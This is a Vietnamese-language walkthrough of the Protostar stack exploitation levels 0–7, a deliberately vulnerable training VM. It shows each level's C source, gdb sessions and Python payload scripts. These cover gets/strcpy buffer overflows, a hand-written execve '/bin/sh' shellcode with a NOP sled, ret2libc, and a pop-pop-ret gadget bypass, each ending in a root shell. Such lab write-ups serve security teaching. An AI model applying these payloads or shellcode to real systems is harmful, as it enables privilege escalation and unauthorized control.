# 1. Stack0
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```  
Ta có cấu trúc của memory sẽ nhìn như này:
```
  |  high memory adddress
  | |====================| 
  | |   name-parameter   |  ^
  | |====================|  | buffer
  S |   return address   |  | direction
  t |====================|  |
  a |  base-pointer|'''''|  |
  c |==============|'''''|  |
  k |''''''''''''''''''''|  |
  | |'''''''buffer'''''''|  |
  | |''''''''''''''''''''|  |
  | |====================|  |
  | |                    |  |
  | |....................|
      low memory address
```  
  Khi inputs bằng gets() sẽ có lỗi buffer overflow làm cho giá trị nhập vào tràn qua base-pointer và return address do gets() sẽ lấy input mà không cần biết điểm dừng và tiếp tục lưu trữ nó dù đã vượt qua khoảng lưu chữ của buffer.  
  Để hoàn thành stack0 ta cần phải thay đổi giá trị mặc định của `modified` thành khác `0`. Khi đó ta sẽ nhận được output `you have changed the 'modified' variable`.  
  
```
user@protostar:/opt/protostar/bin$ python -c "print 'A'*65" > /tmp/payload
user@protostar:/opt/protostar/bin$ cat /tmp/payload | /opt/protostar/bin/stack0
you have changed the 'modified' variable
user@protostar:/opt/protostar/bin$ 
```

# 2. Stack1  
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Ta có thể thấy code stack1 có nhiều điểm tương đồng với stack0, điểm khác là ta không còn thấy câu lệnh gets() nữa mà thay vào đó là đoạn code:
```
if bla bla
...
...
strcpy()
```
Trong stack0 thì buffer overflow xảy ra khi ta sử dụng câu lệnh `gets()`, còn trong bài này thì đó là câu lệnh `strcpy()`.
Và ta sẽ input trực tiếp bằng cách dùng cl argument.  
Đầu tiên là thử với input như stack0:
```
user@protostar:/opt/protostar/bin$ python -c "print 'A'*65" > /tmp/payload
user@protostar:/opt/protostar/bin$ ./stack1 $(cat /tmp/payload)
Try again, you got 0x00000041
user@protostar:/opt/protostar/bin$ 
```
Có thể thấy biến modified đã thay đổi giá trị, tiếp theo là thay đổi giá trị của nó thành `0x61626364`.

Đề bài có hint là `Little Edian` vậy nên input vào thay vì là `61 62 63 64` thì sẽ là `64 63 62 61`.  
```
user@protostar:/opt/protostar/bin$ python -c "import struct;print ('A'*64 + struct.pack('I',0x61626364))" > /tmp/payload
user@protostar:/opt/protostar/bin$ ./stack1 $(cat /tmp/payload)
you have correctly got the variable to the right value
user@protostar:/opt/protostar/bin$ 
```

# 3. Stack2  
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
Khi đọc source có thể thấy stack2 cũng  sẽ dùng `strcpy()` để gây overflow điểm khác là ta sẽ không pass argument trực tiếp nữa mà sẽ thông qua biến môi trường `GREENIE`.  
Kết quả chạy thử khi chưa set biến `GREENIE`:  
```
user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable

user@protostar:/opt/protostar/bin$
```
Sau đó mình đã tạo thử biến `GREENIE` với giá trị bằng 1 và chạy thử:
```
user@protostar:/opt/protostar/bin$ export GREENIE=1
user@protostar:/opt/protostar/bin$ echo $GREENIE
1
user@protostar:/opt/protostar/bin$ ./stack2
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$
```
Sau 1 hồi tìm hiểu thêm thì mình biết rằng biến môi trường còn có thể dùng để execute câu lệnh:
```
user@protostar:/opt/protostar/bin$ export test=$(echo alalala)
user@protostar:/opt/protostar/bin$ export test1=$(python -c "print 'A'")
user@protostar:/opt/protostar/bin$ echo $test
alalala
user@protostar:/opt/protostar/bin$ echo $test1
A
user@protostar:/opt/protostar/bin$ 
```
Đầu tiên là overflow stack2:
```
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*65")
user@protostar:/opt/protostar/bin$ ./stack2
Try again, you got 0x00000041
user@protostar:/opt/protostar/bin$ 
```
Biến `modified` đã được thay đổi giá trị thành công, vậy tiếp theo là thay đổi giá trị của `modified` thành `0x0d0a0d0a`:
```
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "import struct; print('A'*64+struct.pack('I',0x0d0a0d0a)) ")
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
user@protostar:/opt/protostar/bin$ 
```
!Amazing, gudjob em :v
# 4. Stack3  
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Trong source code ta có thể thấy được bài sẽ sử dụng đến hàm con trỏ `volatile int (*fp)();`, con trỏ này sẽ nhận địa chỉ trỏ tới 1 hàm. Và đề bài yêu cầu flow đến hàm `win()`. Vậy nên điều đầu tiên đó là tìm địa chỉ của `win()`:
```
user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep win
08048424 <win>:
user@protostar:/opt/protostar/bin$ 
```
Việc tiếp theo là overflow vào biến `fp` với giá trị là địa chỉ `win()` đã tìm ra ở trên:
```
user@protostar:/opt/protostar/bin$ python -c "import struct;print ('A'*64+struct.pack('I',0x08048424))" > /tmp/payload_st3
user@protostar:/opt/protostar/bin$ cat /tmp/payload_st3 | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ 
```
# 5. Stack4  
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Sau khi hít đống hành tươi trên internet thì mình đã thấy như sau khi `disassemble main` bằng `gdb`:
```
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   %ebp
0x08048409 <main+1>:	mov    %esp,%ebp
0x0804840b <main+3>:	and    $0xfffffff0,%esp
0x0804840e <main+6>:	sub    $0x50,%esp
0x08048411 <main+9>:	lea    0x10(%esp),%eax
0x08048415 <main+13>:	mov    %eax,(%esp)
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
(gdb) 
```
Để ý vào `<main+22>` ta thấy đó là câu lệnh `ret` nó sẽ nhảy đến giá trị địa chỉ ở đỉnh `stack` và `pop` giá trị đó ra `.__.` nhìn có vẻ khó hiểu nhỉ. Okay vậy mình có ví dụ như này cho dễ hiểu:
```
	main proc
		push ebp
		mov ebp, esp
		push 00401003h   <-- địa chỉ của dòng này là 0x00401003
		ret
		ret
	main endp
	end main
```
Đây là đoạn code `masm` mình đã dùng để test khi debug bằng `IDA` có thể giải thích như sau:  
	- dòng `push 00401003h` sẽ tự push địa chỉ của nó vào `stack`  
	- Câu lệnh `ret` bên dưới sẽ gán giá trị của `eip` bằng `00401003` và `pop` nó ra khỏi stack  
	- `eip` sẽ thực thi câu lệnh ở `0x00401003` (`push 00401003h`) từ đó tạo ra loop vô hạn :v  
Để ý lại stack0 ta thấy rằng khi overflow quá length `buffer` thì ta có thể overflow đến giá trị mà `ret` có thể sử dụng vậy việc bây giờ cần làm là tìm ra vị trí đó:
```
user@protostar:/opt/protostar/bin$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'" > /tmp/payload_st4
user@protostar:/opt/protostar/bin$ gdb stack4
(gdb) b *0x0804841e
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) r < /tmp/payload_st4 
Starting program: /opt/protostar/bin/stack4 < /tmp/payload_st4

Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x5353535b
) at stack4/stack4.c:16
16	stack4/stack4.c: No such file or directory.
	in stack4/stack4.c
(gdb) x/2x $ebp
0x53535353:	Cannot access memory at address 0x53535353  <-- 'SSSS'
```
Tiếp theo là tìm địa chỉ của `win()`:

Từ đó mình đã viết file payload:
```
import struct
pd = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU'
winadd = struct.pack("I",0x080483f4)
payload = pd + winadd
print payload
```
Và boom:
```
user@protostar:/opt/protostar/bin$ python /tmp/payload.py > /tmp/payload_st4_final
user@protostar:/opt/protostar/bin$ cat /tmp/payload_st4_final | ./stack4 
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ 
```

# 6. Stack5  
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Stack 5 đã giới thiệu tới shellcode. Thì shellcode là:  
```
Shellcode còn được gọi là bytecode, tạm dịch là mã máy. Chúng ta đều biết mã máy là thứ ngôn ngữ duy nhất mà bộ vi xử lí có thể hiểu được. Tất cả các chương trình viết bằng bất kì ngôn ngữ nào đều phải được biên dịch sang mã máy trước khi máy tính có thể chạy được chương trình đó. Khác với các chương trình này, shellcode được thể hiện như một nhóm các mã máy, do đó máy tính có thể hiểu và thực thi trực tiếp shellcode mà không cần phải trải qua bất kì công đoạn biên dịch nào cả.
```
*Trích nguồn copy trên mạng :v*  
Thay vì dùng shellcode có sẵn, mình đã tự viết 1 shellcode để xuất shell(sau khi tìm hiểu về cách viết shellcode :>). source code `nasm`:  
```
08049000 <_start>:
 8049000:	31 c0                	xor    %eax,%eax
 8049002:	50                   	push   %eax
 8049003:	68 2f 2f 73 68       	push   $0x68732f2f  <-- hs//
 8049008:	68 2f 62 69 6e       	push   $0x6e69622f  <-- nib/
 804900d:	89 e3                	mov    %esp,%ebx
 804900f:	31 d2                	xor    %edx,%edx
 8049011:	31 c9                	xor    %ecx,%ecx
 8049013:	b0 0b                	mov    $0xb,%al 	<-- call execv
 8049015:	cd 80                	int    $0x80
 8049017:	31 db                	xor    %ebx,%ebx
 8049019:	b0 01                	mov    $0x1,%al
 804901b:	cd 80                	int    $0x80
```
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x31\xc9\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd\x80` đoạn shellcode hình thù sẽ như này :v  
tiếp theo là tìm vị trí của `ret`:
```
user@protostar:/opt/protostar/bin$ nano /tmp/payload
user@protostar:/opt/protostar/bin$ cat /tmp/payload
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
user@protostar:/opt/protostar/bin$ gdb stack5
...
...
(gdb) b *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r < /tmp/payload
Starting program: /opt/protostar/bin/stack5 < /tmp/payload

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) x/x $ebp
0x53535353:	Cannot access memory at address 0x53535353 <-- 'SSSS'
(gdb) 
```
Okay giờ ta sẽ có cấu trúc của payload sẽ như sau:
payload = padding + retadd + "\x90"xN + shellcode
```
(gdb) x/100x $esp-80
0xbffff63c:	0xb7eada75	0x41414141	0x42424242	0x43434343  <-- padding bắt đầu từ 0x41414141.
0xbffff64c:	0x44444444	0x45454545	0x46464646	0x47474747
0xbffff65c:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
0xbffff66c:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
0xbffff67c:	0x50505050	0x51515151	0x52525252	0x53535353  <-- kết thúc ở 0x53535353 và sau đó là retadd.
0xbffff68c:	[ret here]	0x55555555	0x56565656	0x57575757  <-- sau ret sẽ là chuỗi \x90\ vì sẽ có sự biến động 
0xbffff69c:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00  	khi chạy và debug, nên sẽ không thể tính chính xác 
0xbffff6ac:	0x08048232	0x00000001	0xbffff6f0	0xb7ff0626		vị trí của shell code.
0xbffff6bc:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000  <-- sau chuỗi NOP sẽ là shellcode do hệ thống sẽ bỏ qua
0xbffff6cc:	0x00000000	0xbffff708	0x51edd019	0x7bb88609		NOP và tiếp tục thực thi.
0xbffff6dc:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff6ec:	0x08048310	0x00000000	0xb7ff6210	0xb7eadb9b
0xbffff6fc:	0xb7ffeff4	0x00000001	0x08048310	0x00000000
0xbffff70c:	0x08048331	0x080483c4	0x00000001	0xbffff734
0xbffff71c:	0x080483f0	0x080483e0	0xb7ff1040	0xbffff72c
0xbffff72c:	0xb7fff8f8	0x00000001	0xbffff87b	0x00000000
```
File payload:
```
import struct
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x31\xc9\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd\x80"
pd = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
nop = "\x90"*100
retadd = struct.pack("I",0xbffff6b0)
payload = pd + retadd + nop + sc
print payload
```
Chạy nào:
```
user@protostar:/opt/protostar/bin$ python /tmp/payload_st5.py > /tmp/payload_st5
user@protostar:/opt/protostar/bin$ cat /tmp/payload_st5 - | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami 
root
ls
final0	final2	 format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
```

# 7. Stack6  
## Source code  
```
 1 #include <stdlib.h>
 2 #include <unistd.h>
 3 #include <stdio.h>
 4 #include <string.h>
 5
 6 void getpath()
 7 {
 8   char buffer[64];
 9   unsigned int ret;
10
11   printf("input path please: "); fflush(stdout);
12
13   gets(buffer);
14
15   ret = __builtin_return_address(0);
16
17   if((ret & 0xbf000000) == 0xbf000000) {
18     printf("bzzzt (%p)\n", ret);
19     _exit(1);
20   }
21
22   printf("got path %s\n", buffer);
23 }
24
25 int main(int argc, char **argv)
26 {
27   getpath();
28
29
30
31 }
```
Trong bài này ta khôn thể sử dụng cách như stack5 được vì đoạn code dưới đây:  
```
  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }
```
Đoạn code này sẽ chặn việc trả về của ta trong khoảng từ `0xbf000000` đến `0xbfffffff`, để dễ hiểu thì hãy lấy ví dụ như này:  
```
giả sử ret = 0xbf333333
	ret & 0xbf000000

	0xbf333333 
&	0xbf000000
	__________
	0xbf000000 <-- luôn luôn bằng 0xbf000000
```
Để có thể xuất được shell thì trong bài này ta sẽ sử dụng phương pháp `ret2libc`.  
Đầu tiên là tìm lượng padding cần thiết để flow được vào `eip`.  
```
(gdb) b *0x08048508
Breakpoint 1 at 0x8048508: file stack6/stack6.c, line 31.
(gdb) r < /tmp/payload 
Starting program: /opt/protostar/bin/stack6 < /tmp/payload
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) x/x $ebp
0x54545454:	Cannot access memory at address 0x54545454 		<-- 'TTTT'
(gdb) 
```
Sau đó là tìm địa chỉ của system() và exit()  
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```
Cuối cùng là tìm địa chỉ của string "/bin/sh":  
```
(gdb) find 0xb7e97000, 0xb7e97000+9999999, "/bin/sh"
0xb7fba23f
warning: Unable to access target memory at 0xb7fd9647, halting search.
1 pattern found.
```
Nhưng khi kiểm tra thì địa chỉ tìm thấy lại không phải chuỗi ta cần tìm :v  
```
(gdb) x/s 0xb7fba23f
0xb7fba23f:	 "KIND in __gen_tempname\""
```
Vậy nên mình đã dùng cách khác:  
```
user@protostar:/opt/protostar/bin$ strings -td /lib/libc-2.11.2.so | grep /bin/sh
1176511 /bin/sh 						<-- địa chỉ của '/bin/sh' = địa chỉ của lib + 1176511
user@protostar:/opt/protostar/bin$ 
``` 
Cuối cùng là ghép lại thành 1 file payload:  
```
import struct
pd = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT"
sysadd = struct.pack("I",0xb7ecffb0)
exitadd = struct.pack("I",0xb7ec60c0)
binadd = struct.pack("I",0xb7e97000+1176511)
payload = pd + sysadd + exitadd + binadd
print payload
```
Chạy file để lấy được shell:  
```
user@protostar:/opt/protostar/bin$ (python /tmp/payload.py; cat) | /opt/protostar/bin/stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP���RRRRSSSSTTTT����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
ls
final0	format0  format3  heap1  net0  net3    stack1  stack4  stack7
final1	format1  format4  heap2  net1  net4    stack2  stack5
final2	format2  heap0	  heap3  net2  stack0  stack3  stack6

```
# 8. Stack7  
## Source code  
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();



}
```
Nhìn bài này thì tưởng ngon ăn ai ngờ bị nó đấm cho u đầu.  
Bài này ta không thể sử dụng cách y hệt stack6. Vì trong câu lệnh if có 1 chút thay đổi:  
```
giả sử ret = 0xb3333333
	ret & 0xb0000000

	0xb3333333 
&	0xb0000000
	__________
	0xb0000000 <-- luôn luôn bằng 0xb0000000
```
*flash back `$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>`*  
Vậy nên ta sẽ không thể trả về giá trị địa chỉ của system() được :v  
Trong bài này ta sẽ sử dụng các `gadget` :>  
Đầu tiên là tìm lượng padding:  
```
(gdb) b *0x08048553
Breakpoint 1 at 0x8048553: file stack7/stack7.c, line 32.
(gdb) r < /tmp/payload
Starting program: /opt/protostar/bin/stack7 < /tmp/payload
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) x/x $ebp
0x54545454:	Cannot access memory at address 0x54545454  <-- 'TTTT'
(gdb) 
```
Tiếp đến là địa chỉ của `system()` , `exit()` và `/bin/sh`:  
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit 
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) quit
user@protostar:/opt/protostar/bin$ strings -td /lib/libc-2.11.2.so | grep /bin/sh
1176511 /bin/sh
user@protostar:/opt/protostar/bin$ 
```
Bước cuối là tìm địa chỉ của `gadget` ở đây mình dùng `pop pop ret`:  
```
user@protostar:/opt/protostar/bin$ objdump -d stack7 | grep -a2 pop
```
Mình đã lấy cái đầu tiên tìm được:  
```
--
 80485f2:	75 f4                	jne    80485e8 <__do_global_ctors_aux+0x18>
 80485f4:	83 c4 04             	add    $0x4,%esp
 80485f7:	5b                   	pop    %ebx 			<-- địa chỉ bắt đầu
 80485f8:	5d                   	pop    %ebp
 80485f9:	c3                   	ret    
 80485fa:	90                   	nop
```
Giải thích một chút, do địa chỉ ret ta đã thay thế vào bắt đầu bằng 0x0 != 0xb vậy nên `if` sẽ được bỏ qua và có thể tiến đến thực hiện việc `pop-pop-ret`. Ta sẽ cần thêm 2 biến garbage dùng cho câu lệnh `pop` và `ret` sẽ trả về giá trị trên đỉnh `stack`(mình đã giải thích ở stack3) vậy nên ngay sau `pop-pop-ret` sẽ là địa chỉ của `system()` và ta có thể chạy bình thường :3
Ghép lại thành file payload nào :>  
```
import struct
pd = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT"
ppr = struct.pack("I",0x080485f7)
pop1 = "AAAA"
pop2 = "BBBB"
sysadd = struct.pack("I",0xb7ecffb0)
exitadd = struct.pack("I",0xb7ec60c0)
binadd = struct.pack("I",0xb7e97000+1176511)
payload = pd + ppr + pop1 + pop2 + sysadd + exitadd + binadd
print payload
```
Chạy file payload để lấy shell:  
```
user@protostar:/opt/protostar/bin$ (python /tmp/payload.py; cat) | /opt/protostar/bin/stack7
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP�RRRRSSSSTTTT�AAAABBBB����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
ls
final0	final1	final2	format0  format1  format2  format3  format4  heap0  heap1  heap2  heap3  net0  net1  net2  net3  net4  stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7
```
